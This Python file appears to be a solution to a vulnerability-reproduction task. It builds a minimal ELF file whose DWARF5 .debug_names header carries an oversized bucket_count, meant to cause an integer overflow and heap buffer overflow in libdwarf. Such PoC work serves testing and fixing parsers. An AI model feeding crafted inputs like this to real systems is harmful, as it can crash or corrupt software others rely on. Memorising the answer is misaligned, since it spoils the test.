import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in libdwarf when parsing a DWARF5 .debug_names section.

        The vulnerability is caused by an integer overflow when calculating the
        size of a buffer to allocate for the hash table buckets. The code
        calculates `bucket_count * 4` using 32-bit arithmetic. By providing a
        `bucket_count` of 0x40000001, the multiplication overflows, resulting
        in a tiny allocation (`malloc(4)`). However, the subsequent loop
        attempts to read `bucket_count` (a large number) of entries into this
        small buffer, leading to a heap buffer overflow.

        The PoC is a minimal 64-bit ELF file containing a specially crafted
        .debug_names section with this malicious `bucket_count`.
        """
        # Helper functions for little-endian packing
        def p16(x): return struct.pack('<H', x)
        def p32(x): return struct.pack('<I', x)
        def p64(x): return struct.pack('<Q', x)

        # --- 1. Section Contents ---

        # .shstrtab content: Name strings for section headers
        shstrtab_content = b'\x00' + b'.shstrtab' + b'\x00' + b'.debug_names' + b'\x00'
        # Pad to a multiple of 4 for alignment (good practice)
        shstrtab_content += b'\x00' * ((4 - len(shstrtab_content) % 4) % 4)
        shstrtab_size = len(shstrtab_content)

        shstrtab_name_offset = shstrtab_content.find(b'.shstrtab')
        debug_names_name_offset = shstrtab_content.find(b'.debug_names')

        # .debug_names content (the payload)
        # This header is read by the vulnerable function.
        debug_names_header_stream = io.BytesIO()
        debug_names_header_stream.write(p16(5))        # version = 5 (DWARF5)
        debug_names_header_stream.write(p16(0))        # padding = 0
        debug_names_header_stream.write(p32(0))        # cu_count = 0
        debug_names_header_stream.write(p32(0))        # local_tu_count = 0
        debug_names_header_stream.write(p32(0))        # foreign_tu_count = 0
        
        # TRIGGER: A large bucket_count causes a 32-bit integer overflow.
        # 0x40000001 * 4 = 0x100000004. In 32-bit arithmetic, this wraps to 4.
        # This leads to `malloc(4)`, but the subsequent loop tries to write
        # 0x40000001 entries, causing a heap buffer overflow on the second write.
        debug_names_header_stream.write(p32(0x40000001)) # bucket_count
        
        debug_names_header_stream.write(p32(1))        # name_count = 1
        debug_names_header_stream.write(p32(1))        # abbrev_table_size = 1
        debug_names_header_stream.write(p32(0))        # augmentation_string_size = 0
        header_content = debug_names_header_stream.getvalue()

        # Some dummy data for the vulnerable function to read.
        # The crash happens very quickly, so we don't need much.
        debug_names_body = b'\x00' * 16
        
        # The unit_length field specifies the size of the data that follows it.
        unit_length = len(header_content) + len(debug_names_body)
        
        debug_names_content = p32(unit_length) + header_content + debug_names_body
        debug_names_size = len(debug_names_content)

        # --- 2. Calculate ELF file layout ---
        
        elf_header_size = 64
        shentsize = 64  # Size of a section header entry (for 64-bit ELF)
        shnum = 3       # Number of sections: NULL, .shstrtab, .debug_names

        shstrtab_offset = elf_header_size
        debug_names_offset = shstrtab_offset + shstrtab_size
        shdr_table_offset = debug_names_offset + debug_names_size
        
        # --- 3. Build ELF Header (Elf64_Ehdr) ---

        elf_header_stream = io.BytesIO()
        elf_header_stream.write(b'\x7fELF\x02\x01\x01' + b'\x00' * 9) # e_ident
        elf_header_stream.write(p16(1))              # e_type = ET_REL
        elf_header_stream.write(p16(62))             # e_machine = EM_X86_64
        elf_header_stream.write(p32(1))              # e_version = EV_CURRENT
        elf_header_stream.write(p64(0))              # e_entry
        elf_header_stream.write(p64(0))              # e_phoff
        elf_header_stream.write(p64(shdr_table_offset)) # e_shoff
        elf_header_stream.write(p32(0))              # e_flags
        elf_header_stream.write(p16(elf_header_size))# e_ehsize
        elf_header_stream.write(p16(0))              # e_phentsize
        elf_header_stream.write(p16(0))              # e_phnum
        elf_header_stream.write(p16(shentsize))      # e_shentsize
        elf_header_stream.write(p16(shnum))          # e_shnum
        elf_header_stream.write(p16(1))              # e_shstrndx (index of .shstrtab)
        elf_header_bytes = elf_header_stream.getvalue()

        # --- 4. Build Section Header Table (Elf64_Shdr) ---

        def build_shdr(name, type, flags, offset, size, align):
            shdr_stream = io.BytesIO()
            shdr_stream.write(p32(name))
            shdr_stream.write(p32(type))
            shdr_stream.write(p64(flags))
            shdr_stream.write(p64(0))       # sh_addr
            shdr_stream.write(p64(offset))
            shdr_stream.write(p64(size))
            shdr_stream.write(p32(0))       # sh_link
            shdr_stream.write(p32(0))       # sh_info
            shdr_stream.write(p64(align))   # sh_addralign
            shdr_stream.write(p64(0))       # sh_entsize
            return shdr_stream.getvalue()

        # NULL Section Header
        shdr_null = build_shdr(0, 0, 0, 0, 0, align=0)
        
        # .shstrtab Section Header
        shdr_shstrtab = build_shdr(shstrtab_name_offset, 3, 0, shstrtab_offset, shstrtab_size, align=1)
        
        # .debug_names Section Header
        shdr_debug_names = build_shdr(debug_names_name_offset, 1, 0, debug_names_offset, debug_names_size, align=1)
        
        shdr_table_bytes = shdr_null + shdr_shstrtab + shdr_debug_names

        # --- 5. Assemble the final PoC file ---

        poc_stream = io.BytesIO()
        poc_stream.write(elf_header_bytes)
        poc_stream.write(shstrtab_content)
        poc_stream.write(debug_names_content)
        poc_stream.write(shdr_table_bytes)
        
        return poc_stream.getvalue()